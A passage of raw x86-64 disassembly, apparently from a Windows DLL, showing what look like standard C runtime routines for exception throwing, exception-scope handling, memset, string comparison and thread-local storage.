   180003298:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   18000329c:	75 f7                	jne    0x180003295
   18000329e:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   1800032a2:	e8 4d 44 00 00       	call   0x1800076f4
   1800032a7:	48 8b d8             	mov    %rax,%rbx
   1800032aa:	48 85 c0             	test   %rax,%rax
   1800032ad:	74 1c                	je     0x1800032cb
   1800032af:	4c 8b 06             	mov    (%rsi),%r8
   1800032b2:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1800032b6:	48 8b c8             	mov    %rax,%rcx
   1800032b9:	e8 6e 45 00 00       	call   0x18000782c
   1800032be:	48 8b c3             	mov    %rbx,%rax
   1800032c1:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   1800032c6:	49 89 06             	mov    %rax,(%r14)
   1800032c9:	33 db                	xor    %ebx,%ebx
   1800032cb:	48 8b cb             	mov    %rbx,%rcx
   1800032ce:	e8 ed 44 00 00       	call   0x1800077c0
   1800032d3:	eb 0a                	jmp    0x1800032df
   1800032d5:	48 8b 01             	mov    (%rcx),%rax
   1800032d8:	48 89 02             	mov    %rax,(%rdx)
   1800032db:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   1800032df:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800032e4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800032e9:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1800032ee:	48 83 c4 20          	add    $0x20,%rsp
   1800032f2:	41 5e                	pop    %r14
   1800032f4:	c3                   	ret
   1800032f5:	cc                   	int3
   1800032f6:	cc                   	int3
   1800032f7:	cc                   	int3
   1800032f8:	40 53                	rex push %rbx
   1800032fa:	48 83 ec 20          	sub    $0x20,%rsp
   1800032fe:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   180003302:	48 8b d9             	mov    %rcx,%rbx
   180003305:	74 08                	je     0x18000330f
   180003307:	48 8b 09             	mov    (%rcx),%rcx
   18000330a:	e8 b1 44 00 00       	call   0x1800077c0
   18000330f:	48 83 23 00          	andq   $0x0,(%rbx)
   180003313:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   180003317:	48 83 c4 20          	add    $0x20,%rsp
   18000331b:	5b                   	pop    %rbx
   18000331c:	c3                   	ret
   18000331d:	cc                   	int3
   18000331e:	cc                   	int3
   18000331f:	cc                   	int3
   180003320:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003325:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000332a:	57                   	push   %rdi
   18000332b:	48 83 ec 50          	sub    $0x50,%rsp
   18000332f:	48 8b da             	mov    %rdx,%rbx
   180003332:	48 8b f1             	mov    %rcx,%rsi
   180003335:	bf 20 05 93 19       	mov    $0x19930520,%edi
   18000333a:	48 85 d2             	test   %rdx,%rdx
   18000333d:	74 1d                	je     0x18000335c
   18000333f:	f6 02 10             	testb  $0x10,(%rdx)
   180003342:	74 18                	je     0x18000335c
   180003344:	48 8b 09             	mov    (%rcx),%rcx
   180003347:	48 83 e9 08          	sub    $0x8,%rcx
   18000334b:	48 8b 01             	mov    (%rcx),%rax
   18000334e:	48 8b 58 30          	mov    0x30(%rax),%rbx
   180003352:	48 8b 40 40          	mov    0x40(%rax),%rax
   180003356:	ff 15 0c cf 00 00    	call   *0xcf0c(%rip)        # 0x180010268
   18000335c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180003361:	48 8b cb             	mov    %rbx,%rcx
   180003364:	ff 15 3e cd 00 00    	call   *0xcd3e(%rip)        # 0x1800100a8
   18000336a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000336f:	48 85 db             	test   %rbx,%rbx
   180003372:	74 0f                	je     0x180003383
   180003374:	f6 03 08             	testb  $0x8,(%rbx)
   180003377:	75 05                	jne    0x18000337e
   180003379:	48 85 c0             	test   %rax,%rax
   18000337c:	75 05                	jne    0x180003383
   18000337e:	bf 00 40 99 01       	mov    $0x1994000,%edi
   180003383:	ba 01 00 00 00       	mov    $0x1,%edx
   180003388:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   18000338d:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   180003392:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180003397:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   18000339c:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800033a1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800033a6:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1800033aa:	ff 15 00 cd 00 00    	call   *0xcd00(%rip)        # 0x1800100b0
   1800033b0:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1800033b5:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1800033ba:	48 83 c4 50          	add    $0x50,%rsp
   1800033be:	5f                   	pop    %rdi
   1800033bf:	c3                   	ret
   1800033c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800033c4:	e8 d7 24 00 00       	call   0x1800058a0
   1800033c9:	84 c0                	test   %al,%al
   1800033cb:	75 04                	jne    0x1800033d1
   1800033cd:	32 c0                	xor    %al,%al
   1800033cf:	eb 12                	jmp    0x1800033e3
   1800033d1:	e8 da 05 00 00       	call   0x1800039b0
   1800033d6:	84 c0                	test   %al,%al
   1800033d8:	75 07                	jne    0x1800033e1
   1800033da:	e8 f5 24 00 00       	call   0x1800058d4
   1800033df:	eb ec                	jmp    0x1800033cd
   1800033e1:	b0 01                	mov    $0x1,%al
   1800033e3:	48 83 c4 28          	add    $0x28,%rsp
   1800033e7:	c3                   	ret
   1800033e8:	48 83 ec 28          	sub    $0x28,%rsp
   1800033ec:	e8 ff 04 00 00       	call   0x1800038f0
   1800033f1:	48 85 c0             	test   %rax,%rax
   1800033f4:	0f 95 c0             	setne  %al
   1800033f7:	48 83 c4 28          	add    $0x28,%rsp
   1800033fb:	c3                   	ret
   1800033fc:	48 83 ec 28          	sub    $0x28,%rsp
   180003400:	33 c9                	xor    %ecx,%ecx
   180003402:	e8 7d 04 00 00       	call   0x180003884
   180003407:	b0 01                	mov    $0x1,%al
   180003409:	48 83 c4 28          	add    $0x28,%rsp
   18000340d:	c3                   	ret
   18000340e:	cc                   	int3
   18000340f:	cc                   	int3
   180003410:	48 83 ec 28          	sub    $0x28,%rsp
   180003414:	84 c9                	test   %cl,%cl
   180003416:	75 0a                	jne    0x180003422
   180003418:	e8 db 05 00 00       	call   0x1800039f8
   18000341d:	e8 b2 24 00 00       	call   0x1800058d4
   180003422:	b0 01                	mov    $0x1,%al
   180003424:	48 83 c4 28          	add    $0x28,%rsp
   180003428:	c3                   	ret
   180003429:	cc                   	int3
   18000342a:	cc                   	int3
   18000342b:	cc                   	int3
   18000342c:	48 83 ec 28          	sub    $0x28,%rsp
   180003430:	e8 c3 05 00 00       	call   0x1800039f8
   180003435:	b0 01                	mov    $0x1,%al
   180003437:	48 83 c4 28          	add    $0x28,%rsp
   18000343b:	c3                   	ret
   18000343c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003441:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003446:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000344b:	57                   	push   %rdi
   18000344c:	41 54                	push   %r12
   18000344e:	41 55                	push   %r13
   180003450:	41 56                	push   %r14
   180003452:	41 57                	push   %r15
   180003454:	48 83 ec 40          	sub    $0x40,%rsp
   180003458:	48 8b e9             	mov    %rcx,%rbp
   18000345b:	4d 8b f9             	mov    %r9,%r15
   18000345e:	49 8b c8             	mov    %r8,%rcx
   180003461:	49 8b f8             	mov    %r8,%rdi
   180003464:	4c 8b ea             	mov    %rdx,%r13
   180003467:	e8 e8 24 00 00       	call   0x180005954
   18000346c:	4d 8b 67 08          	mov    0x8(%r15),%r12
   180003470:	4d 8b 37             	mov    (%r15),%r14
   180003473:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   180003477:	4d 2b f4             	sub    %r12,%r14
   18000347a:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   18000347e:	41 8b 77 48          	mov    0x48(%r15),%esi
   180003482:	0f 85 dc 00 00 00    	jne    0x180003564
   180003488:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   18000348d:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180003492:	3b 33                	cmp    (%rbx),%esi
   180003494:	0f 83 8a 01 00 00    	jae    0x180003624
   18000349a:	8b fe                	mov    %esi,%edi
   18000349c:	48 03 ff             	add    %rdi,%rdi
   18000349f:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   1800034a3:	4c 3b f0             	cmp    %rax,%r14
   1800034a6:	0f 82 aa 00 00 00    	jb     0x180003556
   1800034ac:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   1800034b0:	4c 3b f0             	cmp    %rax,%r14
   1800034b3:	0f 83 9d 00 00 00    	jae    0x180003556
   1800034b9:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   1800034be:	0f 84 92 00 00 00    	je     0x180003556
   1800034c4:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   1800034c9:	74 17                	je     0x1800034e2
   1800034cb:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   1800034cf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800034d4:	49 03 c4             	add    %r12,%rax
   1800034d7:	49 8b d5             	mov    %r13,%rdx
   1800034da:	ff d0                	call   *%rax
   1800034dc:	85 c0                	test   %eax,%eax
   1800034de:	78 7d                	js     0x18000355d
   1800034e0:	7e 74                	jle    0x180003556
   1800034e2:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1800034e9:	75 28                	jne    0x180003513
   1800034eb:	48 83 3d 85 cf 00 00 	cmpq   $0x0,0xcf85(%rip)        # 0x180010478
   1800034f2:	00 
   1800034f3:	74 1e                	je     0x180003513
   1800034f5:	48 8d 0d 7c cf 00 00 	lea    0xcf7c(%rip),%rcx        # 0x180010478
   1800034fc:	e8 4f bc 00 00       	call   0x18000f150
   180003501:	85 c0                	test   %eax,%eax
   180003503:	74 0e                	je     0x180003513
   180003505:	ba 01 00 00 00       	mov    $0x1,%edx
   18000350a:	48 8b cd             	mov    %rbp,%rcx
   18000350d:	ff 15 65 cf 00 00    	call   *0xcf65(%rip)        # 0x180010478
   180003513:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   180003517:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000351d:	49 03 cc             	add    %r12,%rcx
   180003520:	49 8b d5             	mov    %r13,%rdx
   180003523:	e8 f8 23 00 00       	call   0x180005920
   180003528:	49 8b 47 40          	mov    0x40(%r15),%rax
   18000352c:	4c 8b c5             	mov    %rbp,%r8
   18000352f:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   180003533:	49 8b cd             	mov    %r13,%rcx
   180003536:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   18000353a:	49 03 d4             	add    %r12,%rdx
   18000353d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180003542:	49 8b 47 28          	mov    0x28(%r15),%rax
   180003546:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000354b:	ff 15 4f cb 00 00    	call   *0xcb4f(%rip)        # 0x1800100a0
   180003551:	e8 fa 23 00 00       	call   0x180005950
   180003556:	ff c6                	inc    %esi
   180003558:	e9 35 ff ff ff       	jmp    0x180003492
   18000355d:	33 c0                	xor    %eax,%eax
   18000355f:	e9 c5 00 00 00       	jmp    0x180003629
   180003564:	49 8b 7f 20          	mov    0x20(%r15),%rdi
   180003568:	44 8b 0b             	mov    (%rbx),%r9d
   18000356b:	49 2b fc             	sub    %r12,%rdi
   18000356e:	41 3b f1             	cmp    %r9d,%esi
   180003571:	0f 83 ad 00 00 00    	jae    0x180003624
   180003577:	45 8b c1             	mov    %r9d,%r8d
   18000357a:	8b d6                	mov    %esi,%edx
   18000357c:	41 8b c8             	mov    %r8d,%ecx
   18000357f:	48 03 d2             	add    %rdx,%rdx
   180003582:	8b 44 d3 04          	mov    0x4(%rbx,%rdx,8),%eax
   180003586:	4c 3b f0             	cmp    %rax,%r14
   180003589:	0f 82 88 00 00 00    	jb     0x180003617
   18000358f:	8b 44 d3 08          	mov    0x8(%rbx,%rdx,8),%eax
   180003593:	4c 3b f0             	cmp    %rax,%r14
   180003596:	73 7f                	jae    0x180003617
   180003598:	44 8b 5d 04          	mov    0x4(%rbp),%r11d
   18000359c:	41 83 e3 20          	and    $0x20,%r11d
   1800035a0:	74 44                	je     0x1800035e6
   1800035a2:	45 33 d2             	xor    %r10d,%r10d
   1800035a5:	45 85 c0             	test   %r8d,%r8d
   1800035a8:	74 34                	je     0x1800035de
   1800035aa:	41 8b ca             	mov    %r10d,%ecx
   1800035ad:	48 03 c9             	add    %rcx,%rcx
   1800035b0:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   1800035b4:	48 3b f8             	cmp    %rax,%rdi
   1800035b7:	72 1d                	jb     0x1800035d6
   1800035b9:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   1800035bd:	48 3b f8             	cmp    %rax,%rdi
   1800035c0:	73 14                	jae    0x1800035d6
   1800035c2:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   1800035c6:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   1800035ca:	75 0a                	jne    0x1800035d6
   1800035cc:	8b 44 d3 0c          	mov    0xc(%rbx,%rdx,8),%eax
   1800035d0:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   1800035d4:	74 08                	je     0x1800035de
   1800035d6:	41 ff c2             	inc    %r10d
   1800035d9:	45 3b d0             	cmp    %r8d,%r10d
   1800035dc:	72 cc                	jb     0x1800035aa
   1800035de:	41 8b c9             	mov    %r9d,%ecx
   1800035e1:	45 3b d1             	cmp    %r9d,%r10d
   1800035e4:	75 3e                	jne    0x180003624
   1800035e6:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   1800035ea:	85 c0                	test   %eax,%eax
   1800035ec:	74 0c                	je     0x1800035fa
   1800035ee:	48 3b f8             	cmp    %rax,%rdi
   1800035f1:	75 24                	jne    0x180003617
   1800035f3:	45 85 db             	test   %r11d,%r11d
   1800035f6:	75 2c                	jne    0x180003624
   1800035f8:	eb 1d                	jmp    0x180003617
   1800035fa:	8d 46 01             	lea    0x1(%rsi),%eax
   1800035fd:	b1 01                	mov    $0x1,%cl
   1800035ff:	41 89 47 48          	mov    %eax,0x48(%r15)
   180003603:	44 8b 44 d3 0c       	mov    0xc(%rbx,%rdx,8),%r8d
   180003608:	49 8b d5             	mov    %r13,%rdx
   18000360b:	4d 03 c4             	add    %r12,%r8
   18000360e:	41 ff d0             	call   *%r8
   180003611:	44 8b 0b             	mov    (%rbx),%r9d
   180003614:	41 8b c9             	mov    %r9d,%ecx
   180003617:	ff c6                	inc    %esi
   180003619:	44 8b c1             	mov    %ecx,%r8d
   18000361c:	3b f1                	cmp    %ecx,%esi
   18000361e:	0f 82 56 ff ff ff    	jb     0x18000357a
   180003624:	b8 01 00 00 00       	mov    $0x1,%eax
   180003629:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   18000362e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   180003632:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   180003636:	49 8b 73 40          	mov    0x40(%r11),%rsi
   18000363a:	49 8b e3             	mov    %r11,%rsp
   18000363d:	41 5f                	pop    %r15
   18000363f:	41 5e                	pop    %r14
   180003641:	41 5d                	pop    %r13
   180003643:	41 5c                	pop    %r12
   180003645:	5f                   	pop    %rdi
   180003646:	c3                   	ret
   180003647:	cc                   	int3
   180003648:	cc                   	int3
   180003649:	cc                   	int3
   18000364a:	cc                   	int3
   18000364b:	cc                   	int3
   18000364c:	cc                   	int3
   18000364d:	cc                   	int3
   18000364e:	cc                   	int3
   18000364f:	cc                   	int3
   180003650:	cc                   	int3
   180003651:	cc                   	int3
   180003652:	cc                   	int3
   180003653:	cc                   	int3
   180003654:	cc                   	int3
   180003655:	cc                   	int3
   180003656:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000365d:	00 00 00 
   180003660:	57                   	push   %rdi
   180003661:	8b c2                	mov    %edx,%eax
   180003663:	48 8b f9             	mov    %rcx,%rdi
   180003666:	49 8b c8             	mov    %r8,%rcx
   180003669:	f3 aa                	rep stos %al,(%rdi)
   18000366b:	49 8b c3             	mov    %r11,%rax
   18000366e:	5f                   	pop    %rdi
   18000366f:	c3                   	ret
   180003670:	cc                   	int3
   180003671:	cc                   	int3
   180003672:	cc                   	int3
   180003673:	cc                   	int3
   180003674:	cc                   	int3
   180003675:	cc                   	int3
   180003676:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000367d:	00 00 00 
   180003680:	4c 8b d9             	mov    %rcx,%r11
   180003683:	0f b6 d2             	movzbl %dl,%edx
   180003686:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   18000368d:	01 01 01 
   180003690:	4c 0f af ca          	imul   %rdx,%r9
   180003694:	49 83 f8 10          	cmp    $0x10,%r8
   180003698:	0f 86 f2 00 00 00    	jbe    0x180003790
   18000369e:	66 49 0f 6e c1       	movq   %r9,%xmm0
   1800036a3:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   1800036a7:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1800036ae:	77 10                	ja     0x1800036c0
   1800036b0:	e9 6b 00 00 00       	jmp    0x180003720
   1800036b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800036bc:	00 00 00 00 
   1800036c0:	f6 05 f9 79 01 00 02 	testb  $0x2,0x179f9(%rip)        # 0x18001b0c0
   1800036c7:	75 97                	jne    0x180003660
   1800036c9:	0f 11 01             	movups %xmm0,(%rcx)
   1800036cc:	4c 03 c1             	add    %rcx,%r8
   1800036cf:	48 83 c1 10          	add    $0x10,%rcx
   1800036d3:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   1800036d7:	4c 2b c1             	sub    %rcx,%r8
   1800036da:	4d 8b c8             	mov    %r8,%r9
   1800036dd:	49 c1 e9 07          	shr    $0x7,%r9
   1800036e1:	74 3d                	je     0x180003720
   1800036e3:	4c 3b 0d 3e 69 01 00 	cmp    0x1693e(%rip),%r9        # 0x18001a028
   1800036ea:	0f 87 60 00 00 00    	ja     0x180003750
   1800036f0:	0f 29 01             	movaps %xmm0,(%rcx)
   1800036f3:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1800036f7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1800036fe:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   180003702:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   180003706:	49 ff c9             	dec    %r9
   180003709:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   18000370d:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   180003711:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   180003715:	66 0f 29 41 f0       	movapd %xmm0,-0x10(%rcx)
   18000371a:	75 d4                	jne    0x1800036f0
   18000371c:	49 83 e0 7f          	and    $0x7f,%r8
   180003720:	4d 8b c8             	mov    %r8,%r9
   180003723:	49 c1 e9 04          	shr    $0x4,%r9
   180003727:	74 13                	je     0x18000373c
   180003729:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003730:	0f 11 01             	movups %xmm0,(%rcx)
   180003733:	48 83 c1 10          	add    $0x10,%rcx
   180003737:	49 ff c9             	dec    %r9
   18000373a:	75 f4                	jne    0x180003730
   18000373c:	49 83 e0 0f          	and    $0xf,%r8
   180003740:	74 06                	je     0x180003748
   180003742:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   180003748:	49 8b c3             	mov    %r11,%rax
   18000374b:	c3                   	ret
   18000374c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003750:	0f 2b 01             	movntps %xmm0,(%rcx)
   180003753:	0f 2b 41 10          	movntps %xmm0,0x10(%rcx)
   180003757:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   18000375e:	0f 2b 41 a0          	movntps %xmm0,-0x60(%rcx)
   180003762:	0f 2b 41 b0          	movntps %xmm0,-0x50(%rcx)
   180003766:	49 ff c9             	dec    %r9
   180003769:	0f 2b 41 c0          	movntps %xmm0,-0x40(%rcx)
   18000376d:	0f 2b 41 d0          	movntps %xmm0,-0x30(%rcx)
   180003771:	0f 2b 41 e0          	movntps %xmm0,-0x20(%rcx)
   180003775:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   180003779:	75 d5                	jne    0x180003750
   18000377b:	0f ae f8             	sfence
   18000377e:	49 83 e0 7f          	and    $0x7f,%r8
   180003782:	eb 9c                	jmp    0x180003720
   180003784:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   18000378b:	00 00 00 00 00 
   180003790:	49 8b d1             	mov    %r9,%rdx
   180003793:	4c 8d 0d 66 c8 ff ff 	lea    -0x379a(%rip),%r9        # 0x180000000
   18000379a:	43 8b 84 81 00 e0 01 	mov    0x1e000(%r9,%r8,4),%eax
   1800037a1:	00 
   1800037a2:	4c 03 c8             	add    %rax,%r9
   1800037a5:	49 03 c8             	add    %r8,%rcx
   1800037a8:	49 8b c3             	mov    %r11,%rax
   1800037ab:	41 ff e1             	jmp    *%r9
   1800037ae:	66 90                	xchg   %ax,%ax
   1800037b0:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   1800037b4:	89 51 f9             	mov    %edx,-0x7(%rcx)
   1800037b7:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   1800037bb:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1800037be:	c3                   	ret
   1800037bf:	90                   	nop
   1800037c0:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   1800037c4:	89 51 fc             	mov    %edx,-0x4(%rcx)
   1800037c7:	c3                   	ret
   1800037c8:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   1800037cc:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1800037cf:	c3                   	ret
   1800037d0:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   1800037d4:	89 51 fb             	mov    %edx,-0x5(%rcx)
   1800037d7:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1800037da:	c3                   	ret
   1800037db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800037e0:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   1800037e4:	89 51 fa             	mov    %edx,-0x6(%rcx)
   1800037e7:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   1800037eb:	c3                   	ret
   1800037ec:	48 89 10             	mov    %rdx,(%rax)
   1800037ef:	c3                   	ret
   1800037f0:	48 89 10             	mov    %rdx,(%rax)
   1800037f3:	66 89 50 08          	mov    %dx,0x8(%rax)
   1800037f7:	88 50 0a             	mov    %dl,0xa(%rax)
   1800037fa:	c3                   	ret
   1800037fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003800:	48 89 10             	mov    %rdx,(%rax)
   180003803:	66 89 50 08          	mov    %dx,0x8(%rax)
   180003807:	c3                   	ret
   180003808:	48 89 10             	mov    %rdx,(%rax)
   18000380b:	48 89 50 08          	mov    %rdx,0x8(%rax)
   18000380f:	c3                   	ret
   180003810:	48 3b ca             	cmp    %rdx,%rcx
   180003813:	74 19                	je     0x18000382e
   180003815:	48 83 c2 09          	add    $0x9,%rdx
   180003819:	48 8d 41 09          	lea    0x9(%rcx),%rax
   18000381d:	48 2b d0             	sub    %rax,%rdx
   180003820:	8a 08                	mov    (%rax),%cl
   180003822:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   180003825:	75 0a                	jne    0x180003831
   180003827:	48 ff c0             	inc    %rax
   18000382a:	84 c9                	test   %cl,%cl
   18000382c:	75 f2                	jne    0x180003820
   18000382e:	33 c0                	xor    %eax,%eax
   180003830:	c3                   	ret
   180003831:	1b c0                	sbb    %eax,%eax
   180003833:	83 c8 01             	or     $0x1,%eax
   180003836:	c3                   	ret
   180003837:	cc                   	int3
   180003838:	40 53                	rex push %rbx
   18000383a:	48 83 ec 20          	sub    $0x20,%rsp
   18000383e:	ff 15 74 c8 00 00    	call   *0xc874(%rip)        # 0x1800100b8
   180003844:	48 85 c0             	test   %rax,%rax
   180003847:	74 13                	je     0x18000385c
   180003849:	48 8b 18             	mov    (%rax),%rbx
   18000384c:	48 8b c8             	mov    %rax,%rcx
   18000384f:	e8 6c 3f 00 00       	call   0x1800077c0
   180003854:	48 8b c3             	mov    %rbx,%rax
   180003857:	48 85 db             	test   %rbx,%rbx
   18000385a:	75 ed                	jne    0x180003849
   18000385c:	48 83 c4 20          	add    $0x20,%rsp
   180003860:	5b                   	pop    %rbx
   180003861:	c3                   	ret
   180003862:	cc                   	int3
   180003863:	cc                   	int3
   180003864:	48 83 ec 28          	sub    $0x28,%rsp
   180003868:	48 85 c9             	test   %rcx,%rcx
   18000386b:	74 11                	je     0x18000387e
   18000386d:	48 8d 05 8c 78 01 00 	lea    0x1788c(%rip),%rax        # 0x18001b100
   180003874:	48 3b c8             	cmp    %rax,%rcx
   180003877:	74 05                	je     0x18000387e
   180003879:	e8 42 3f 00 00       	call   0x1800077c0
   18000387e:	48 83 c4 28          	add    $0x28,%rsp
   180003882:	c3                   	ret
   180003883:	cc                   	int3
   180003884:	40 53                	rex push %rbx
   180003886:	48 83 ec 20          	sub    $0x20,%rsp
   18000388a:	48 8b d9             	mov    %rcx,%rbx
   18000388d:	8b 0d 9d 67 01 00    	mov    0x1679d(%rip),%ecx        # 0x18001a030
   180003893:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180003896:	74 33                	je     0x1800038cb
   180003898:	48 85 db             	test   %rbx,%rbx
   18000389b:	75 0e                	jne    0x1800038ab
   18000389d:	e8 ca 22 00 00       	call   0x180005b6c
   1800038a2:	8b 0d 88 67 01 00    	mov    0x16788(%rip),%ecx        # 0x18001a030
   1800038a8:	48 8b d8             	mov    %rax,%rbx
   1800038ab:	33 d2                	xor    %edx,%edx
   1800038ad:	e8 02 23 00 00       	call   0x180005bb4
   1800038b2:	48 85 db             	test   %rbx,%rbx
   1800038b5:	74 14                	je     0x1800038cb
   1800038b7:	48 8d 05 42 78 01 00 	lea    0x17842(%rip),%rax        # 0x18001b100
   1800038be:	48 3b d8             	cmp    %rax,%rbx
   1800038c1:	74 08                	je     0x1800038cb
   1800038c3:	48 8b cb             	mov    %rbx,%rcx
   1800038c6:	e8 f5 3e 00 00       	call   0x1800077c0
   1800038cb:	48 83 c4 20          	add    $0x20,%rsp
   1800038cf:	5b                   	pop    %rbx
   1800038d0:	c3                   	ret
   1800038d1:	cc                   	int3
   1800038d2:	cc                   	int3
   1800038d3:	cc                   	int3
   1800038d4:	48 83 ec 28          	sub    $0x28,%rsp
   1800038d8:	e8 13 00 00 00       	call   0x1800038f0
   1800038dd:	48 85 c0             	test   %rax,%rax
   1800038e0:	74 05                	je     0x1800038e7
   1800038e2:	48 83 c4 28          	add    $0x28,%rsp
   1800038e6:	c3                   	ret
   1800038e7:	e8 e8 3e 00 00       	call   0x1800077d4
   1800038ec:	cc                   	int3
   1800038ed:	cc                   	int3
   1800038ee:	cc                   	int3
   1800038ef:	cc                   	int3
   1800038f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800038f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800038fa:	57                   	push   %rdi
   1800038fb:	48 83 ec 20          	sub    $0x20,%rsp
   1800038ff:	83 3d 2a 67 01 00 ff 	cmpl   $0xffffffff,0x1672a(%rip)        # 0x18001a030
   180003906:	75 07                	jne    0x18000390f
   180003908:	33 c0                	xor    %eax,%eax
   18000390a:	e9 90 00 00 00       	jmp    0x18000399f
   18000390f:	ff 15 ab c7 00 00    	call   *0xc7ab(%rip)        # 0x1800100c0
   180003915:	8b 0d 15 67 01 00    	mov    0x16715(%rip),%ecx        # 0x18001a030
   18000391b:	8b f8                	mov    %eax,%edi
   18000391d:	e8 4a 22 00 00       	call   0x180005b6c
   180003922:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180003926:	33 f6                	xor    %esi,%esi
   180003928:	48 3b c2             	cmp    %rdx,%rax
   18000392b:	74 67                	je     0x180003994
   18000392d:	48 85 c0             	test   %rax,%rax
   180003930:	74 05                	je     0x180003937
   180003932:	48 8b f0             	mov    %rax,%rsi
   180003935:	eb 5d                	jmp    0x180003994
   180003937:	8b 0d f3 66 01 00    	mov    0x166f3(%rip),%ecx        # 0x18001a030
   18000393d:	e8 72 22 00 00       	call   0x180005bb4
   180003942:	85 c0                	test   %eax,%eax
   180003944:	74 4e                	je     0x180003994
   180003946:	ba 80 00 00 00       	mov    $0x80,%edx
   18000394b:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   18000394e:	e8 39 3f 00 00       	call   0x18000788c
   180003953:	8b 0d d7 66 01 00    	mov    0x166d7(%rip),%ecx        # 0x18001a030
   180003959:	48 8b d8             	mov    %rax,%rbx
   18000395c:	48 85 c0             	test   %rax,%rax
   18000395f:	74 24                	je     0x180003985
   180003961:	48 8b d0             	mov    %rax,%rdx
   180003964:	e8 4b 22 00 00       	call   0x180005bb4
